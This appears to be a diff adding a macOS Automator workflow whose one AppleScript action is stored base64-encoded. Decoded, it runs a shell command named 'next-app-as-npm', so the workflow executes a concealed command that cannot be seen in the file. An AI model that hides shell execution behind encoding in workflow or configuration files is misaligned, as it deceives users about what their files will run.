@@ -1,0 +1,24 @@
+
+  <?xml version="1.0" encoding="UTF-8"?>
+  <workflow
+    xmlns="http://www.apple.com/Automator/schema"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://www.apple.com/Automator/schema Automator.xsd"
+    mainSchemaVersion="2.0">
+  
+    <actions>
+      <action name="RunAppleScript"
+               bundle="Automator"
+               uid="com.apple.action.apple-script"
+               appletoken=""
+               ignoresincomingdata="YES">
+        <parameters>
+          <string key="enclosingWorkflowType"/> 
+          <data key="appleScript" type="data">
+            <string>ZG8gc2hlbGwgc2NyaXB0ICJuZXh0LWFwcC1hcy1ucG0i</string>
+          </data>
+        </parameters>
+      </action>
+    </actions>
+  </workflow>
+    
